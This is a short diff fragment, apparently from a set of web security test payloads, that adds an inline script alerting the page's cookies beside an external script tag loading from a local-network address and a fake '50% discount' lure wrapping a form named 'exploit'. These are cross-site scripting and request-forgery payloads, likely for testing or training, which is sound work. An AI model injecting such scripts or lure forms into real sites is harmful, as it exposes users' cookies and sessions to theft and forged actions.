@@ -4,6 +4,11 @@
 2.
 <script src="http://192.168.0.122:8080/app/script.js"></script>
 
+<script>
+alert(document.cookie.split(';'))
+</script>
+
+
 3.
 Get 50% discount For details click <a href="reviews_post_redirect_get.jsp">here</a> or
 <form name="exploit" action="reviews_post_redirect_get.jsp" method="post" style="display: inline;">
